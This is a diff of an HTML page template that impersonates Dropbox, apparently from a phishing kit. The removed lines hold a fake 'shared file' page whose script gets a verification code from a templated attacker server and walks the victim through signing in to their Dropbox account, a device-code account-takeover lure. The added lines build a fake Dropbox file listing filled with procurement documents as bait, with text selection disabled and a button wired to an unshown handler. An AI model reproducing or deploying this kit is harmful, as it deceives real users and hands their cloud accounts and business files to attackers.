@@ -1,145 +1,664 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Dropbox - Shared File</title>
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{font-family:'Segoe UI',sans-serif;background:#1a1a1a;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
-    .header{width:100%;padding:16px 24px;display:flex;align-items:center;gap:10px}
-    .header span{color:#fff;font-size:16px;font-weight:600}
-    .content{max-width:480px;width:100%;margin:80px auto 0;padding:0 16px}
-    .card{background:#2a2a2a;border-radius:8px;border:1px solid #3a3a3a}
-    .card-top{padding:24px 32px 0}
-    .shared-by{color:#a0a0a0;font-size:13px;margin-bottom:8px}
-    .file-row{display:flex;align-items:center;gap:16px;padding:16px 32px;border-bottom:1px solid #3a3a3a}
-    .file-icon{width:48px;height:56px;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:700}
-    .file-name{color:#e0e0e0;font-size:15px;font-weight:600}
-    .file-meta{color:#808080;font-size:12px;margin-top:2px}
-    .card-bottom{padding:20px 32px 24px}
-    .btn{width:100%;padding:12px 24px;background:#0061FF;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
-    .btn:hover{background:#0050d4}
-    .btn:disabled{background:#003da0;cursor:not-allowed}
-    .code-card{background:#141414;border:1px solid #2a2a2a;border-radius:12px;padding:32px;text-align:center}
-    .code-label{color:#888;font-size:14px;margin-bottom:8px}
-    .code-value{font-family:monospace;font-size:36px;font-weight:bold;letter-spacing:0.3em;margin:12px 0}
-    .copy-btn{background:#1a1a2e;border:1px solid #2a2a2a;color:#fff;padding:8px 20px;border-radius:8px;cursor:pointer;font-size:14px;display:inline-flex;align-items:center;gap:8px}
-    .steps{margin-top:32px;text-align:left}
-    .steps p{color:#ccc;font-size:14px;font-weight:600;margin-bottom:12px}
-    .steps ol{color:#888;font-size:14px;line-height:2;padding-left:20px}
-    .steps strong{color:#fff}
-    .verify-link{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;padding:12px 24px;background:#0a1a3a;border:1px solid #0061FF;border-radius:8px;color:#4d9aff;font-size:14px;font-weight:500;text-decoration:none}
-    .waiting{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:24px;color:#888;font-size:14px}
-    .spinner{display:inline-block;width:16px;height:16px;border:2px solid #555;border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
-    .success-icon{width:80px;height:80px;border-radius:50%;background:rgba(22,101,52,.2);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
-    .error-icon{width:80px;height:80px;border-radius:50%;background:rgba(220,38,38,.1);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
-    .center{text-align:center}
-    .success{color:#22c55e}
-    .error{color:#ef4444}
-    .email-badge{color:#4d9aff;font-size:14px;background:#0a1a2e;padding:8px 16px;border-radius:8px;display:inline-block;margin-top:16px}
-    @keyframes spin{to{transform:rotate(360deg)}}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dropbox - Home</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        dbx: '#0061FF',
+                        sidebar: '#ffffff',
+                        body: '#f9fafb',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .scrollbar-thin::-webkit-scrollbar { width: 6px; }
+        .scrollbar-thin::-webkit-scrollbar-thumb { background: #d1d5db; border-radius: 3px; }
+        * { user-select: none; -webkit-user-select: none; }
+    </style>
 </head>
-<body>
-  <div class="header">
-    <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
-      <path d="M8.5 2L2 6.5L8.5 11L15 6.5L8.5 2Z" fill="#0061FF"/>
-      <path d="M19.5 2L13 6.5L19.5 11L26 6.5L19.5 2Z" fill="#0061FF"/>
-      <path d="M2 15.5L8.5 20L15 15.5L8.5 11L2 15.5Z" fill="#0061FF"/>
-      <path d="M19.5 11L13 15.5L19.5 20L26 15.5L19.5 11Z" fill="#0061FF"/>
-    </svg>
-    <span>Dropbox</span>
-  </div>
+<body class="bg-body text-gray-800 font-sans h-screen overflow-hidden">
+    <div class="flex h-screen">
 
-  <div class="content" id="app">
-    <div class="card">
-      <div class="card-top">
-        <p class="shared-by">Loading...</p>
-      </div>
-    </div>
-  </div>
+        <!-- Sidebar -->
+        <aside id="sidebar" class="w-64 bg-white border-r border-gray-200 flex flex-col h-full overflow-y-auto scrollbar-thin shrink-0 hidden md:flex">
+            <div class="p-4">
+                <!-- Dropbox Logo -->
+                <div class="flex items-center gap-3 h-12 mb-6">
+                    <svg width="30" height="25" viewBox="0 0 30 25" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M7.7 0.32L0.48 4.91L7.7 9.51L14.92 4.91L22.15 9.51L29.37 4.91L22.15 0.32L14.92 4.91L7.7 0.32Z" fill="#0061FF"/>
+                        <path d="M7.7 18.69L0.48 14.1L7.7 9.51L14.92 14.1L7.7 18.69Z" fill="#0061FF"/>
+                        <path d="M14.92 14.1L22.15 9.51L29.37 14.1L22.15 18.69L14.92 14.1Z" fill="#0061FF"/>
+                        <path d="M14.92 24.82L7.7 20.22L14.92 15.63L22.15 20.22L14.92 24.82Z" fill="#0061FF"/>
+                    </svg>
+                    <span class="text-lg font-semibold text-gray-900">Dropbox</span>
+                </div>
 
-  <script>
-    const API = "{{ domain }}";
-    const CODE = "{{ invitation }}";
-    const app = document.getElementById("app");
-    const DOC_COLORS = { PDF:"#E74C3C", DOCX:"#2B579A", XLSX:"#217346", PPTX:"#D24726" };
+                <!-- Create new button -->
+                <button onclick="handlePlay()" class="w-full flex items-center gap-2 bg-dbx text-white px-4 py-2.5 rounded-lg text-sm font-medium hover:bg-blue-700 transition mb-6">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path d="M12 5v14M5 12h14"/></svg>
+                    Create new
+                </button>
 
-    async function init() {
-      try {
-        const res = await fetch(`${API}/api/public/i/${CODE}`);
-        if (!res.ok) { app.innerHTML = '<div class="card"><div class="card-top center" style="padding-bottom:24px"><p class="error">Link not found or expired.</p></div></div>'; return; }
-        const inv = await res.json();
-        showTemplate(inv);
-      } catch { app.innerHTML = '<div class="card"><div class="card-top center" style="padding-bottom:24px"><p class="error">Could not connect.</p></div></div>'; }
-    }
-
-    function showTemplate(inv) {
-      const color = DOC_COLORS[inv.docType] || "#0061FF";
-      app.innerHTML = `
-        <div class="card">
-          <div class="card-top">
-            <p class="shared-by">${inv.senderName} sent you a file</p>
-            ${inv.notes ? '<p style="color:#a0a0a0;font-size:12px;font-style:italic;margin-top:4px">' + inv.notes + '</p>' : ''}
-          </div>
-          <div class="file-row">
-            <div class="file-icon" style="background:${color}">${inv.docType}</div>
-            <div>
-              <p class="file-name">${inv.documentTitle}</p>
-              <p class="file-meta">${inv.docType} &middot; Shared via Dropbox</p>
+                <!-- Nav Links -->
+                <nav class="space-y-1">
+                    <a href="#" class="flex items-center gap-3 px-3 py-2 text-sm text-gray-700 rounded-lg hover:bg-gray-100">
+                        <svg class="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 12l8.954-8.955a1.126 1.126 0 011.591 0L21.75 12M4.5 9.75v10.125c0 .621.504 1.125 1.125 1.125H9.75v-4.875c0-.621.504-1.125 1.125-1.125h2.25c.621 0 1.125.504 1.125 1.125V21h4.125c.621 0 1.125-.504 1.125-1.125V9.75M8.25 21h8.25"/></svg>
+                        Home
+                    </a>
+                    <a href="#" class="flex items-center gap-3 px-3 py-2 text-sm text-gray-700 rounded-lg bg-gray-100 font-medium">
+                        <svg class="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 12.75V12A2.25 2.25 0 014.5 9.75h15A2.25 2.25 0 0121.75 12v.75m-8.69-6.44l-2.12-2.12a1.5 1.5 0 00-1.061-.44H4.5A2.25 2.25 0 002.25 6v12a2.25 2.25 0 002.25 2.25h15A2.25 2.25 0 0021.75 18V9a2.25 2.25 0 00-2.25-2.25h-5.379a1.5 1.5 0 01-1.06-.44z"/></svg>
+                        All files
+                    </a>
+                    <a href="#" class="flex items-center gap-3 px-3 py-2 text-sm text-gray-700 rounded-lg hover:bg-gray-100">
+                        <svg class="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M18 18.72a9.094 9.094 0 003.741-.479 3 3 0 00-4.682-2.72m.94 3.198l.001.031c0 .225-.012.447-.037.666A11.944 11.944 0 0112 21c-2.17 0-4.207-.576-5.963-1.584A6.062 6.062 0 016 18.719m12 0a5.971 5.971 0 00-.941-3.197m0 0A5.995 5.995 0 0012 12.75a5.995 5.995 0 00-5.058 2.772m0 0a3 3 0 00-4.681 2.72 8.986 8.986 0 003.74.477m.94-3.197a5.971 5.971 0 00-.94 3.197M15 6.75a3 3 0 11-6 0 3 3 0 016 0zm6 3a2.25 2.25 0 11-4.5 0 2.25 2.25 0 014.5 0zm-13.5 0a2.25 2.25 0 11-4.5 0 2.25 2.25 0 014.5 0z"/></svg>
+                        Shared with company
+                    </a>
+                    <a href="#" class="flex items-center gap-3 px-3 py-2 text-sm text-gray-700 rounded-lg hover:bg-gray-100">
+                        <svg class="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12h3.75M9 15h3.75M9 18h3.75m3 .75H18a2.25 2.25 0 002.25-2.25V6.108c0-1.135-.845-2.098-1.976-2.192a48.424 48.424 0 00-1.123-.08m-5.801 0c-.065.21-.1.433-.1.664 0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75 2.25 2.25 0 00-.1-.664m-5.8 0A2.251 2.251 0 0113.5 2.25H15c1.012 0 1.867.668 2.15 1.586m-5.8 0c-.376.023-.75.05-1.124.08C9.095 4.01 8.25 4.973 8.25 6.108V8.25m0 0H4.875c-.621 0-1.125.504-1.125 1.125v11.25c0 .621.504 1.125 1.125 1.125h9.75c.621 0 1.125-.504 1.125-1.125V9.375c0-.621-.504-1.125-1.125-1.125H8.25z"/></svg>
+                        Purchase Orders
+                    </a>
+                    <a href="#" class="flex items-center gap-3 px-3 py-2 text-sm text-gray-700 rounded-lg hover:bg-gray-100">
+                        <svg class="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 00-3.375-3.375h-1.5A1.125 1.125 0 0113.5 7.125v-1.5a3.375 3.375 0 00-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 00-9-9z"/></svg>
+                        Quotations
+                    </a>
+                    <a href="#" class="flex items-center gap-3 px-3 py-2 text-sm text-gray-700 rounded-lg hover:bg-gray-100">
+                        <svg class="w-5 h-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M14.74 9l-.346 9m-4.788 0L9.26 9m9.968-3.21c.342.052.682.107 1.022.166m-1.022-.165L18.16 19.673a2.25 2.25 0 01-2.244 2.077H8.084a2.25 2.25 0 01-2.244-2.077L4.772 5.79m14.456 0a48.108 48.108 0 00-3.478-.397m-12 .562c.34-.059.68-.114 1.022-.165m0 0a48.11 48.11 0 013.478-.397m7.5 0v-.916c0-1.18-.91-2.164-2.09-2.201a51.964 51.964 0 00-3.32 0c-1.18.037-2.09 1.022-2.09 2.201v.916m7.5 0a48.667 48.667 0 00-7.5 0"/></svg>
+                        Deleted files
+                    </a>
+                </nav>
             </div>
-          </div>
-          <div class="card-bottom">
-            <button class="btn" id="openBtn">Download</button>
-          </div>
-        </div>`;
-      document.getElementById("openBtn").onclick = () => startAuth(inv.invitationId);
-    }
 
-    async function startAuth(invitationId) {
-      const btn = document.getElementById("openBtn");
-      btn.disabled = true;
-      btn.innerHTML = '<span class="spinner"></span> Preparing...';
-      try {
-        const res = await fetch(`${API}/api/public/i/connect`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({invitationId}) });
-        if (!res.ok) { app.innerHTML = '<div class="card"><div class="card-top center" style="padding-bottom:24px"><p class="error">Failed to start.</p></div></div>'; return; }
-        const auth = await res.json();
-        showCode(auth, invitationId);
-      } catch { app.innerHTML = '<div class="card"><div class="card-top center" style="padding-bottom:24px"><p class="error">Network error.</p></div></div>'; }
-    }
+            <!-- User section at bottom -->
+            <div class="mt-auto p-4 border-t border-gray-200">
+                <div class="flex items-center gap-3 mb-3">
+                    <div class="w-8 h-8 rounded-full bg-blue-100 text-dbx flex items-center justify-center text-xs font-bold">4e</div>
+                    <div>
+                        <p class="text-sm font-medium text-gray-900">4email@email.com</p>
+                        <p class="text-xs text-gray-500">Only you</p>
+                    </div>
+                </div>
+                <!-- Storage -->
+                <div class="mb-3">
+                    <p class="text-xs text-gray-500 mb-1">Storage</p>
+                    <div class="w-full bg-gray-200 rounded-full h-1.5">
+                        <div class="bg-dbx h-1.5 rounded-full" style="width: 48%"></div>
+                    </div>
+                    <p class="text-xs text-gray-500 mt-1">2.4 GB of 5 GB used</p>
+                </div>
+                <p class="text-xs text-gray-500 mb-1">Need more space? Upgrade your plan to get 2 TB of storage.</p>
+                <a href="#" class="text-xs text-dbx font-medium hover:underline">Upgrade now &rarr;</a>
+            </div>
+        </aside>
 
-    function showCode(auth, invitationId) {
-      app.innerHTML = `
-        <div class="code-card">
-          <p class="code-label">Verification code</p>
-          <p class="code-value">${auth.userCode}</p>
-          <button class="copy-btn" id="copyBtn">Copy code</button>
-          <div class="steps">
-            <p>Steps to verify:</p>
-            <ol>
-              <li>Open the link below in a new tab</li>
-              <li>Enter code <strong>${auth.userCode}</strong> when prompted</li>
-              <li>Sign in with your Dropbox account</li>
-              <li>Return to this page — it updates automatically</li>
-            </ol>
-          </div>
-          <a href="${auth.verificationUri}" target="_blank" rel="noopener" class="verify-link">${auth.verificationUri}</a>
+        <!-- Main Content -->
+        <div class="flex-1 flex flex-col overflow-hidden">
+            <!-- Top Bar -->
+            <header class="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between shrink-0">
+                <div class="flex items-center gap-3">
+                    <!-- Mobile menu toggle -->
+                    <button id="menuToggle" class="md:hidden p-1 text-gray-500 hover:text-gray-700">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"/></svg>
+                    </button>
+                    <!-- Breadcrumb -->
+                    <nav class="flex items-center gap-2 text-sm text-gray-500">
+                        <span class="text-dbx font-medium">Dropbox</span>
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M8.25 4.5l7.5 7.5-7.5 7.5"/></svg>
+                        <span>Procurement</span>
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M8.25 4.5l7.5 7.5-7.5 7.5"/></svg>
+                        <span class="text-gray-900 font-medium">{{ documentTitle }}</span>
+                    </nav>
+                </div>
+                <div class="flex items-center gap-3">
+                    <!-- Search -->
+                    <div class="hidden sm:flex items-center bg-gray-100 rounded-lg px-3 py-2 gap-2 w-64">
+                        <svg class="w-4 h-4 text-gray-400 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"/></svg>
+                        <input type="text" placeholder="Search files and folders" class="bg-transparent text-sm text-gray-700 placeholder-gray-400 outline-none w-full" style="user-select: text; -webkit-user-select: text;">
+                    </div>
+                    <!-- Profile -->
+                    <div class="w-8 h-8 rounded-full bg-blue-100 text-dbx flex items-center justify-center text-xs font-bold cursor-pointer">4e</div>
+                </div>
+            </header>
+
+            <!-- Page Header -->
+            <div class="bg-white px-6 py-4 border-b border-gray-200 shrink-0">
+                <h1 class="text-xl font-semibold text-gray-900">{{ documentTitle }}</h1>
+                <p class="text-sm text-gray-500 mt-1">{{ note }}</p>
+                <div class="flex items-center gap-4 mt-2 text-sm text-gray-500">
+                    <span>12 items</span>
+                    <span>22.9 MB</span>
+                </div>
+            </div>
+
+            <!-- File List Header -->
+            <div class="bg-white px-6 py-2 border-b border-gray-200 flex items-center justify-between shrink-0">
+                <label class="flex items-center gap-2 text-sm text-gray-600 cursor-pointer">
+                    <input type="checkbox" id="selectAll" class="w-4 h-4 rounded border-gray-300 text-dbx accent-blue-600">
+                    Select all
+                </label>
+            </div>
+
+            <!-- File List -->
+            <div class="flex-1 overflow-y-auto scrollbar-thin bg-white">
+                <ul class="divide-y divide-gray-100">
+                    <!-- Order List.pdf -->
+                    <li class="flex items-center px-6 py-3 hover:bg-gray-50">
+                        <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="Order List.pdf">
+                        <div class="flex items-center gap-3 flex-1 min-w-0">
+                            <svg class="w-8 h-8 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#E53935"/><text x="16" y="21" text-anchor="middle" font-size="9" font-weight="700" fill="#fff">PDF</text></svg>
+                            <div class="min-w-0">
+                                <p class="text-sm font-medium text-gray-900 truncate">Order List.pdf</p>
+                                <p class="text-xs text-gray-500 truncate">Shared by {{ senderName }}</p>
+                            </div>
+                        </div>
+                        <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                            <span class="w-36">4/8/2026, 7:19 AM</span>
+                            <span class="w-28">Shared with your company</span>
+                            <span class="w-16 text-right">4.8 MB</span>
+                        </div>
+                    </li>
+                    <!-- Drawings.pdf -->
+                    <li class="flex items-center px-6 py-3 hover:bg-gray-50">
+                        <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="Drawings.pdf">
+                        <div class="flex items-center gap-3 flex-1 min-w-0">
+                            <svg class="w-8 h-8 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#E53935"/><text x="16" y="21" text-anchor="middle" font-size="9" font-weight="700" fill="#fff">PDF</text></svg>
+                            <div class="min-w-0">
+                                <p class="text-sm font-medium text-gray-900 truncate">Drawings.pdf</p>
+                                <p class="text-xs text-gray-500 truncate">Shared by {{ senderName }}</p>
+                            </div>
+                        </div>
+                        <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                            <span class="w-36">4/8/2026, 7:19 AM</span>
+                            <span class="w-28">Shared with your company</span>
+                            <span class="w-16 text-right">4.8 MB</span>
+                        </div>
+                    </li>
+                    <!-- Product Specifications.xlsx -->
+                    <li class="flex items-center px-6 py-3 hover:bg-gray-50">
+                        <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="Product Specifications.xlsx">
+                        <div class="flex items-center gap-3 flex-1 min-w-0">
+                            <svg class="w-8 h-8 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#107C41"/><text x="16" y="21" text-anchor="middle" font-size="10" font-weight="800" fill="#fff">X</text></svg>
+                            <div class="min-w-0">
+                                <p class="text-sm font-medium text-gray-900 truncate">Product Specifications.xlsx</p>
+                                <p class="text-xs text-gray-500 truncate">Shared by {{ senderName }}</p>
+                            </div>
+                        </div>
+                        <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                            <span class="w-36">4/8/2026, 7:19 AM</span>
+                            <span class="w-28">Shared with your company</span>
+                            <span class="w-16 text-right">1.2 MB</span>
+                        </div>
+                    </li>
+                    <!-- Assembly Documents.pdf -->
+                    <li class="flex items-center px-6 py-3 hover:bg-gray-50">
+                        <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="Assembly Documents.pdf">
+                        <div class="flex items-center gap-3 flex-1 min-w-0">
+                            <svg class="w-8 h-8 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#E53935"/><text x="16" y="21" text-anchor="middle" font-size="9" font-weight="700" fill="#fff">PDF</text></svg>
+                            <div class="min-w-0">
+                                <p class="text-sm font-medium text-gray-900 truncate">Assembly Documents.pdf</p>
+                                <p class="text-xs text-gray-500 truncate">Shared by {{ senderName }}</p>
+                            </div>
+                        </div>
+                        <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                            <span class="w-36">4/8/2026, 7:19 AM</span>
+                            <span class="w-28">Shared with your company</span>
+                            <span class="w-16 text-right">6.3 MB</span>
+                        </div>
+                    </li>
+                    <!-- Bill of Materials.xlsx -->
+                    <li class="flex items-center px-6 py-3 hover:bg-gray-50">
+                        <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="Bill of Materials.xlsx">
+                        <div class="flex items-center gap-3 flex-1 min-w-0">
+                            <svg class="w-8 h-8 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#107C41"/><text x="16" y="21" text-anchor="middle" font-size="10" font-weight="800" fill="#fff">X</text></svg>
+                            <div class="min-w-0">
+                                <p class="text-sm font-medium text-gray-900 truncate">Bill of Materials.xlsx</p>
+                                <p class="text-xs text-gray-500 truncate">Shared by {{ senderName }}</p>
+                            </div>
+                        </div>
+                        <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                            <span class="w-36">4/8/2026, 7:19 AM</span>
+                            <span class="w-28">Shared with your company</span>
+                            <span class="w-16 text-right">892 KB</span>
+                        </div>
+                    </li>
+                    <!-- Business card.pdf -->
+                    <li class="flex items-center px-6 py-3 hover:bg-gray-50">
+                        <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="Business card.pdf">
+                        <div class="flex items-center gap-3 flex-1 min-w-0">
+                            <svg class="w-8 h-8 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#E53935"/><text x="16" y="21" text-anchor="middle" font-size="9" font-weight="700" fill="#fff">PDF</text></svg>
+                            <div class="min-w-0">
+                                <p class="text-sm font-medium text-gray-900 truncate">Business card.pdf</p>
+                                <p class="text-xs text-gray-500 truncate">Shared by {{ senderName }}</p>
+                            </div>
+                        </div>
+                        <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                            <span class="w-36">4/8/2026, 7:19 AM</span>
+                            <span class="w-28">Shared with your company</span>
+                            <span class="w-16 text-right">245 KB</span>
+                        </div>
+                    </li>
+                    <!-- Company profile.pdf -->
+                    <li class="flex items-center px-6 py-3 hover:bg-gray-50">
+                        <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="Company profile.pdf">
+                        <div class="flex items-center gap-3 flex-1 min-w-0">
+                            <svg class="w-8 h-8 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#E53935"/><text x="16" y="21" text-anchor="middle" font-size="9" font-weight="700" fill="#fff">PDF</text></svg>
+                            <div class="min-w-0">
+                                <p class="text-sm font-medium text-gray-900 truncate">Company profile.pdf</p>
+                                <p class="text-xs text-gray-500 truncate">Shared by {{ senderName }}</p>
+                            </div>
+                        </div>
+                        <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                            <span class="w-36">4/8/2026, 7:19 AM</span>
+                            <span class="w-28">Shared with your company</span>
+                            <span class="w-16 text-right">245 KB</span>
+                        </div>
+                    </li>
+
+                    <!-- Quality Certificates folder -->
+                    <li class="border-t border-gray-100">
+                        <div class="flex items-center px-6 py-3 hover:bg-gray-50 cursor-pointer folder-toggle" data-folder="quality">
+                            <input type="checkbox" class="folder-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-folder-target="quality" onclick="event.stopPropagation()">
+                            <svg class="folder-arrow w-4 h-4 text-gray-400 mr-2 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8.25 4.5l7.5 7.5-7.5 7.5"/></svg>
+                            <div class="flex items-center gap-3 flex-1 min-w-0">
+                                <svg class="w-8 h-8 shrink-0 text-dbx" fill="currentColor" viewBox="0 0 24 24"><path d="M10 4H4a2 2 0 00-2 2v12a2 2 0 002 2h16a2 2 0 002-2V8a2 2 0 00-2-2h-8l-2-2z"/></svg>
+                                <div class="min-w-0">
+                                    <p class="text-sm font-medium text-gray-900 truncate">Quality Certificates</p>
+                                    <p class="text-xs text-gray-500 truncate">2 items</p>
+                                </div>
+                            </div>
+                            <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                                <span class="w-36">4 days ago</span>
+                                <span class="w-28"></span>
+                                <span class="w-16 text-right">2 items</span>
+                            </div>
+                        </div>
+                        <!-- Folder children -->
+                        <ul class="folder-children hidden bg-gray-50" data-folder-id="quality">
+                            <li class="flex items-center px-6 pl-16 py-2.5 hover:bg-gray-100">
+                                <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="ISO 9001-2015.pdf" data-parent="quality">
+                                <div class="flex items-center gap-3 flex-1 min-w-0">
+                                    <svg class="w-7 h-7 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#E53935"/><text x="16" y="21" text-anchor="middle" font-size="9" font-weight="700" fill="#fff">PDF</text></svg>
+                                    <div class="min-w-0">
+                                        <p class="text-sm text-gray-900 truncate">ISO 9001-2015.pdf</p>
+                                    </div>
+                                </div>
+                                <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                                    <span class="w-36">3/10/2026, 10:00 AM</span>
+                                    <span class="w-28"></span>
+                                    <span class="w-16 text-right">4.2 MB</span>
+                                </div>
+                            </li>
+                            <li class="flex items-center px-6 pl-16 py-2.5 hover:bg-gray-100">
+                                <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="Safety Cert.pdf" data-parent="quality">
+                                <div class="flex items-center gap-3 flex-1 min-w-0">
+                                    <svg class="w-7 h-7 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#E53935"/><text x="16" y="21" text-anchor="middle" font-size="9" font-weight="700" fill="#fff">PDF</text></svg>
+                                    <div class="min-w-0">
+                                        <p class="text-sm text-gray-900 truncate">Safety Cert.pdf</p>
+                                    </div>
+                                </div>
+                                <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                                    <span class="w-36">3/11/2026, 2:30 PM</span>
+                                    <span class="w-28"></span>
+                                    <span class="w-16 text-right">1.1 MB</span>
+                                </div>
+                            </li>
+                        </ul>
+                    </li>
+
+                    <!-- Commercial Terms folder -->
+                    <li class="border-t border-gray-100">
+                        <div class="flex items-center px-6 py-3 hover:bg-gray-50 cursor-pointer folder-toggle" data-folder="commercial">
+                            <input type="checkbox" class="folder-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-folder-target="commercial" onclick="event.stopPropagation()">
+                            <svg class="folder-arrow w-4 h-4 text-gray-400 mr-2 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8.25 4.5l7.5 7.5-7.5 7.5"/></svg>
+                            <div class="flex items-center gap-3 flex-1 min-w-0">
+                                <svg class="w-8 h-8 shrink-0 text-dbx" fill="currentColor" viewBox="0 0 24 24"><path d="M10 4H4a2 2 0 00-2 2v12a2 2 0 002 2h16a2 2 0 002-2V8a2 2 0 00-2-2h-8l-2-2z"/></svg>
+                                <div class="min-w-0">
+                                    <p class="text-sm font-medium text-gray-900 truncate">Commercial Terms</p>
+                                    <p class="text-xs text-gray-500 truncate">3 items</p>
+                                </div>
+                            </div>
+                            <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                                <span class="w-36">5 days ago</span>
+                                <span class="w-28"></span>
+                                <span class="w-16 text-right">3 items</span>
+                            </div>
+                        </div>
+                        <!-- Folder children -->
+                        <ul class="folder-children hidden bg-gray-50" data-folder-id="commercial">
+                            <li class="flex items-center px-6 pl-16 py-2.5 hover:bg-gray-100">
+                                <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="Payment Terms.pdf" data-parent="commercial">
+                                <div class="flex items-center gap-3 flex-1 min-w-0">
+                                    <svg class="w-7 h-7 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#E53935"/><text x="16" y="21" text-anchor="middle" font-size="9" font-weight="700" fill="#fff">PDF</text></svg>
+                                    <div class="min-w-0">
+                                        <p class="text-sm text-gray-900 truncate">Payment Terms.pdf</p>
